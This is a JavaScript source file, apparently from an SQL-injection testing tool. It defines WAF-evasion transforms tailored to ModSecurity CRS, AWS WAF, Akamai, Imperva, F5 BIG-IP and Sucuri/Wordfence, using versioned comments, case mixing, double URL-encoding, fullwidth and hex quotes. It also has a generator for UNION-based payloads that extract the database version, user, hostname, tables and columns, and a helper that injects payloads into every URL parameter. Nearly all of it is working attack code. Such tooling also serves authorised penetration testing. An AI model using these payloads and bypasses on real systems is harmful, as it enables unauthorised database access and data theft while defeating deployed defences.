                .replace(/union/gi, "/*!UNION*/")
                .replace(/select/gi, "/*!SELECT*/")
                .replace(/and/gi, "/*!AND*/")
                .replace(/or/gi, "/*!OR*/")
                .replace(/from/gi, "/*!FROM*/")
                .replace(/where/gi, "/*!WHERE*/")
                .replace(/order/gi, "/*!ORDER*/")
                .replace(/by/gi, "/*!BY*/")
                .replace(/sleep/gi, "/*!SLEEP*/")
        },
        {
            name: "/*!50000*/ Versioned",
            transform: (p) => p
                .replace(/union/gi, "/*!50000UNION*/")
                .replace(/select/gi, "/*!50000SELECT*/")
                .replace(/and/gi, "/*!50000AND*/")
                .replace(/or/gi, "/*!50000OR*/")
                .replace(/from/gi, "/*!50000FROM*/")
                .replace(/where/gi, "/*!50000WHERE*/")
                .replace(/sleep/gi, "/*!50000SLEEP*/")
        },
        {
            name: "LIKE / RLIKE / REGEXP",
            transform: (p) => p
                .replace(/1\s*=\s*1/gi, "1 LIKE 1")
                .replace(/1\s*=\s*2/gi, "1 LIKE 2")
                .replace(/'1'\s*=\s*'1'/gi, "'1' LIKE '1'")
                .replace(/'1'\s*=\s*'2'/gi, "'1' REGEXP '2'")
                .replace(/1\s*=\s*1/gi, "1 RLIKE '1'")
        },
        {
            name: "BETWEEN / NOT BETWEEN",
            transform: (p) => p
                .replace(/1\s*=\s*1/gi, "1 BETWEEN 0 AND 1")
                .replace(/1\s*=\s*2/gi, "1 NOT BETWEEN 0 AND 1")
        },
        {
            name: "Null-safe <=> + Comments",
            transform: (p) => p
                .replace(/=\s*/g, "<=>")
                .replace(/\s+/g, "/**/")
        },
        {
            name: "%0a + Inline Comments",
            transform: (p) => p.replace(/\s+/g, "/**/%0a/**/")
        },
        {
            name: "Multi-level nested comments",
            transform: (p) => p
                .replace(/\s+/g, "/**//**/")
                .replace(/union/gi, "/*!UNION*/")
                .replace(/select/gi, "/*!SELECT*/")
        },
        {
            name: "SOUNDS LIKE / RLIKE Tricks",
            transform: (p) => p
                .replace(/1\s*=\s*1/gi, "'a' SOUNDS LIKE 'a'")
                .replace(/1\s*=\s*2/gi, "'a' SOUNDS LIKE 'b'")
        },
        {
            name: "IN (SELECT) Style",
            transform: (p) => p
                .replace(/1\s*=\s*1/gi, "1 IN (SELECT 1)")
                .replace(/1\s*=\s*2/gi, "1 IN (SELECT 0)")
        },
        {
            name: "Strong CRS: Versioned + Case + %0a",
            transform: (p) => p
                .replace(/\s+/g, "%0a")
                .replace(/union/gi, "/*!50000uNiOn*/")
                .replace(/select/gi, "/*!50000sElEcT*/")
                .replace(/and/gi, "/*!50000aNd*/")
                .replace(/or/gi, "/*!50000oR*/")
        },
        {
            name: "CRS – Comment everything + LIKE",
            transform: (p) => p
                .replace(/\s+/g, "/**/")
                .replace(/1\s*=\s*1/gi, "1/**/LIKE/**/1")
                .replace(/1\s*=\s*2/gi, "1/**/LIKE/**/2")
                .replace(/union/gi, "/*!UNION*/")
                .replace(/select/gi, "/*!SELECT*/")
        }
    ],

        /* ================================================================
           AWS WAF
           ================================================================ */
        "AWS WAF": [
            {
                name: "Comment Injection + Case",
                transform: (p) => p
                    .replace(/\s+/g, "/**/")
                    .replace(/union/gi, "UnIoN/**/")
                    .replace(/select/gi, "SeLeCt/**/")
                    .replace(/and/gi, "AnD/**/")
                    .replace(/or/gi, "oR/**/")
                    .replace(/from/gi, "FrOm/**/")
                    .replace(/where/gi, "WhErE/**/")
            },
            {
                name: "URL Encode + Comments",
                transform: (p) => encodeURIComponent(p.replace(/\s+/g, "/**/"))
            },
            {
                name: "Double Encode + Case Mix",
                transform: (p) => encodeURIComponent(encodeURIComponent(
                    p.replace(/union/gi, "UnIoN")
                        .replace(/select/gi, "SeLeCt")
                        .replace(/and/gi, "AnD")
                        .replace(/or/gi, "oR")
                        .replace(/\s+/g, "/**/")
                ))
            },
            {
                name: "/*!50000*/ + Newline",
                transform: (p) => p
                    .replace(/union/gi, "/*!50000UNION*/")
                    .replace(/select/gi, "/*!50000SELECT*/")
                    .replace(/and/gi, "/*!50000AND*/")
                    .replace(/or/gi, "/*!50000OR*/")
                    .replace(/\s+/g, "%0a")
            },
            {
                name: "Versioned + Double Encode",
                transform: (p) => encodeURIComponent(
                    p.replace(/union/gi, "/*!50000UNION*/")
                        .replace(/select/gi, "/*!50000SELECT*/")
                        .replace(/\s+/g, "/**/")
                )
            },
            {
                name: "Scientific + Comments",
                transform: (p) => p
                    .replace(/\b1\s*=\s*1\b/gi, "1e0=1e0")
                    .replace(/\b1\s*=\s*2\b/gi, "1e0=2e0")
                    .replace(/\s+/g, "/**/")
                    .replace(/union/gi, "/*!UNION*/")
                    .replace(/select/gi, "/*!SELECT*/")
            },
            {
                name: "|| / && + Comments + Case",
                transform: (p) => p
                    .replace(/\bOR\b/gi, "||")
                    .replace(/\bAND\b/gi, "&&")
                    .replace(/\s+/g, "/**/")
                    .replace(/union/gi, "UnIoN")
                    .replace(/select/gi, "SeLeCt")
            },
            {
                name: "Strong AWS Combo",
                transform: (p) => encodeURIComponent(
                    p.replace(/\s+/g, "/**/%0a/**/")
                        .replace(/union/gi, "/*!50000UnIoN*/")
                        .replace(/select/gi, "/*!50000SeLeCt*/")
                        .replace(/and/gi, "/*!50000AnD*/")
                        .replace(/or/gi, "/*!50000oR*/")
                )
            },
            {
                name: "AWS – Multiline + Versioned",
                transform: (p) => p
                    .replace(/\s+/g, "%0a")
                    .replace(/union/gi, "/*!50000UNION*/")
                    .replace(/select/gi, "/*!50000SELECT*/")
                    .replace(/from/gi, "/*!50000FROM*/")
                    .replace(/where/gi, "/*!50000WHERE*/")
            }
        ],

            /* ================================================================
               AKAMAI
               ================================================================ */
            "Akamai": [
                {
                    name: "Fullwidth Quote + Comments",
                    transform: (p) => p
                        .replace(/'/g, "＇")
                        .replace(/\s+/g, "/**/")
                },
                {
                    name: "Fullwidth + Case Mix",
                    transform: (p) => p
                        .replace(/'/g, "＇")
                        .replace(/union/gi, "UnIoN")
                        .replace(/select/gi, "SeLeCt")
                        .replace(/and/gi, "AnD")
                        .replace(/or/gi, "oR")
                        .replace(/\s+/g, "/**/")
                },
                {
                    name: "Unicode %u0027 + Case",
                    transform: (p) => p
                        .replace(/'/g, "%u0027")
                        .replace(/"/g, "%u0022")
                        .replace(/union/gi, "UnIoN")
                        .replace(/select/gi, "SeLeCt")
                        .replace(/\s+/g, "/**/")
                },
                {
                    name: "Multi-level Comments",
                    transform: (p) => p
                        .replace(/\s+/g, "/**//**/")
                        .replace(/union/gi, "/*!UNION*/")
                        .replace(/select/gi, "/*!SELECT*/")
                        .replace(/and/gi, "/*!AND*/")
                        .replace(/or/gi, "/*!OR*/")
                },
                {
                    name: "Versioned + Fullwidth",
                    transform: (p) => p
                        .replace(/'/g, "＇")
                        .replace(/union/gi, "/*!50000UNION*/")
                        .replace(/select/gi, "/*!50000SELECT*/")
                        .replace(/\s+/g, "/**/")
                },
                {
                    name: "%0a + Unicode + Case",
                    transform: (p) => p
                        .replace(/'/g, "%u0027")
                        .replace(/\s+/g, "%0a")
                        .replace(/union/gi, "UnIoN")
                        .replace(/select/gi, "SeLeCt")
                },
                {
                    name: "Akamai Strong Combo",
                    transform: (p) => p
                        .replace(/'/g, "＇")
                        .replace(/\s+/g, "/**/%0a/**/")
                        .replace(/union/gi, "/*!50000UnIoN*/")
                        .replace(/select/gi, "/*!50000SeLeCt*/")
                        .replace(/and/gi, "/*!50000AnD*/")
                        .replace(/or/gi, "/*!50000oR*/")
                },
                {
                    name: "Overlong UTF-8 style (basic)",
                    transform: (p) => p
                        .replace(/'/g, "%c0%a7")		// overlong single quote approximation
                        .replace(/\s+/g, "/**/")
                }
            ],

                /* ================================================================
                   IMPERVA / INCAPSULA
                   ================================================================ */
                "Imperva / Incapsula": [
                    {
                        name: "/*!50000UNION SELECT*/ classic",
                        transform: (p) => p
                            .replace(/union\s+select/gi, "/*!50000UNION SELECT*/")
                            .replace(/union/gi, "/*!50000UNION*/")
                            .replace(/select/gi, "/*!50000SELECT*/")
                            .replace(/and/gi, "/*!50000AND*/")
                            .replace(/or/gi, "/*!50000OR*/")
                            .replace(/from/gi, "/*!50000FROM*/")
                            .replace(/where/gi, "/*!50000WHERE*/")
                    },
                    {
                        name: "Multi-Comment + Newline",
                        transform: (p) => p.replace(/\s+/g, "/**/%0a/**/")
                    },
                    {
                        name: "Case + Inline + Newline",
                        transform: (p) => p
                            .replace(/\s+/g, "%0a")
                            .replace(/union/gi, "uNiOn")
                            .replace(/select/gi, "sElEcT")
                            .replace(/and/gi, "aNd")
                            .replace(/or/gi, "oR")
                    },
                    {
                        name: "Nested /*! */ + Case",
                        transform: (p) => p
                            .replace(/union/gi, "/*!uNiOn*/")
                            .replace(/select/gi, "/*!sElEcT*/")
                            .replace(/and/gi, "/*!aNd*/")
                            .replace(/or/gi, "/*!oR*/")
                            .replace(/\s+/g, "/**/")
                    },
                    {
                        name: "Double Encode + Versioned",
                        transform: (p) => encodeURIComponent(encodeURIComponent(
                            p.replace(/union/gi, "/*!50000UNION*/")
                                .replace(/select/gi, "/*!50000SELECT*/")
                                .replace(/\s+/g, "/**/")
                        ))
                    },
                    {
                        name: "Imperva Strong (Versioned + %0a + Case)",
                        transform: (p) => p
                            .replace(/\s+/g, "%0a")
                            .replace(/union/gi, "/*!50000UnIoN*/")
                            .replace(/select/gi, "/*!50000SeLeCt*/")
                            .replace(/and/gi, "/*!50000AnD*/")
                            .replace(/or/gi, "/*!50000oR*/")
                            .replace(/from/gi, "/*!50000FrOm*/")
                    },
                    {
                        name: "Comment density extreme",
                        transform: (p) => p
                            .replace(/\s+/g, "/**//**//**/")
                            .replace(/union/gi, "/*!UNION*/")
                            .replace(/select/gi, "/*!SELECT*/")
                    }
                ],

                    /* ================================================================
                       F5 BIG-IP ASM
                       ================================================================ */
                    "F5 BIG-IP": [
                        {
                            name: "Heavy Inline Comments",
                            transform: (p) => p
                                .replace(/\s+/g, "/**/")
                                .replace(/union/gi, "/*!UNION*/")
                                .replace(/select/gi, "/*!SELECT*/")
                                .replace(/and/gi, "/*!AND*/")
                                .replace(/or/gi, "/*!OR*/")
                        },
                        {
                            name: "Hex Quote (0x27) + Comments",
                            transform: (p) => p
                                .replace(/'/g, "0x27")
                                .replace(/\s+/g, "/**/")
                        },
                        {
                            name: "CHAR(39) + Comments",
                            transform: (p) => p
                                .replace(/'/g, "CHAR(39)")
                                .replace(/\s+/g, "/**/")
                        },
                        {
                            name: "Case Mixing + /**/",
                            transform: (p) => p
                                .replace(/\s+/g, "/**/")
                                .replace(/union/gi, "UnIoN")
                                .replace(/select/gi, "SeLeCt")
                                .replace(/and/gi, "AnD")
                                .replace(/or/gi, "oR")
                                .replace(/from/gi, "FrOm")
                                .replace(/where/gi, "WhErE")
                        },
                        {
                            name: "Versioned /*!50000*/ + Case",
                            transform: (p) => p
                                .replace(/union/gi, "/*!50000UnIoN*/")
                                .replace(/select/gi, "/*!50000SeLeCt*/")
                                .replace(/and/gi, "/*!50000AnD*/")
                                .replace(/or/gi, "/*!50000oR*/")
                                .replace(/\s+/g, "/**/")
                        },
                        {
                            name: "Newline + Hex + Comments",
                            transform: (p) => p
                                .replace(/'/g, "0x27")
                                .replace(/\s+/g, "%0a")
                                .replace(/union/gi, "/*!UNION*/")
                                .replace(/select/gi, "/*!SELECT*/")
                        },
                        {
                            name: "F5 Strong Combo",
                            transform: (p) => p
                                .replace(/'/g, "CHAR(39)")
                                .replace(/\s+/g, "/**/%0a/**/")
                                .replace(/union/gi, "/*!50000UNION*/")
                                .replace(/select/gi, "/*!50000SELECT*/")
                                .replace(/and/gi, "/*!50000AND*/")
                                .replace(/or/gi, "/*!50000OR*/")
                        },
                        {
                            name: "CONCAT / CHAR friendly",
                            transform: (p) => p
                                .replace(/\s+/g, "/**/")
                                .replace(/union/gi, "UnIoN")
                                .replace(/select/gi, "SeLeCt")
                                .replace(/'/g, "CHAR(39)")
                        }
                    ],

                        /* ================================================================
                           EXTRA: Sucuri / Wordfence / Generic PHP-WAFs
                           ================================================================ */
                        "Sucuri / Wordfence": [
                            {
                                name: "Versioned + Case + Comments",
                                transform: (p) => p
                                    .replace(/\s+/g, "/**/")
                                    .replace(/union/gi, "/*!50000UnIoN*/")
                                    .replace(/select/gi, "/*!50000SeLeCt*/")
                                    .replace(/and/gi, "/*!50000AnD*/")
                                    .replace(/or/gi, "/*!50000oR*/")
                            },
                            {
                                name: "Double Encode + Newline",
                                transform: (p) => encodeURIComponent(encodeURIComponent(
                                    p.replace(/\s+/g, "%0a")
                                ))
                            },
                            {
                                name: "Fullwidth + Comments",
                                transform: (p) => p
                                    .replace(/'/g, "＇")
                                    .replace(/\s+/g, "/**/")
                                    .replace(/union/gi, "/*!UNION*/")
                                    .replace(/select/gi, "/*!SELECT*/")
                            },
                            {
                                name: "LIKE + Comments + Case",
                                transform: (p) => p
                                    .replace(/1\s*=\s*1/gi, "1/**/LIKE/**/1")
                                    .replace(/1\s*=\s*2/gi, "1/**/LIKE/**/2")
                                    .replace(/\s+/g, "/**/")
                                    .replace(/union/gi, "UnIoN")
                                    .replace(/select/gi, "SeLeCt")
                            }
                        ]
};

/**
 * Dynamic UNION / ORDER BY payload generator
 */
function buildUnionPayload(type, columns) {
    const cols = Math.max(1, Math.min(50, parseInt(columns, 10) || 5));
    const nulls = Array(cols).fill("NULL").join(",");
    const numbers = Array.from({ length: cols }, (_, i) => i + 1).join(",");
    const nullsRest = cols > 1 ? "," + Array(cols - 1).fill("NULL").join(",") : "";

    switch (type) {
        case "union-null":
            return `' UNION SELECT ${nulls}--`;
        case "union-all-null":
            return `' UNION ALL SELECT ${nulls}--`;
        case "union-numbers":
            return `' UNION SELECT ${numbers}--`;
        case "union-version":
            return `' UNION SELECT @@version${nullsRest}--`;
        case "union-user":
            return `' UNION SELECT user()${nullsRest}--`;
        case "union-db":
            return `' UNION SELECT database()${nullsRest}--`;
        case "union-hostname":
            return `' UNION SELECT @@hostname${nullsRest}--`;
        case "union-orderby":
            return `' ORDER BY ${cols}--`;
        case "union-tables":
            return `' UNION SELECT table_name${nullsRest} FROM information_schema.tables--`;
        case "union-columns":
            return `' UNION SELECT column_name${nullsRest} FROM information_schema.columns--`;
        default:
            return `' UNION SELECT ${numbers}--`;
    }
}


/**
 * Legacy function – no longer used (cursor injection is preferred)
 * Kept only for reference / possible future "Inject into all params" feature
 */
function createTestUrl(url, payload) {
    try {
        const target = new URL(url);
        const keys = Array.from(target.searchParams.keys());

        if (keys.length === 0) {
            target.searchParams.set("id", payload);
            return target.toString();
        }

        keys.forEach(key => {
            const current = target.searchParams.get(key) || "";
            target.searchParams.set(key, current + payload);
        });

        return target.toString();
    } catch (e) {
        return url + (url.includes("?") ? "&" : "?") + "payload=" + encodeURIComponent(payload);
    }
}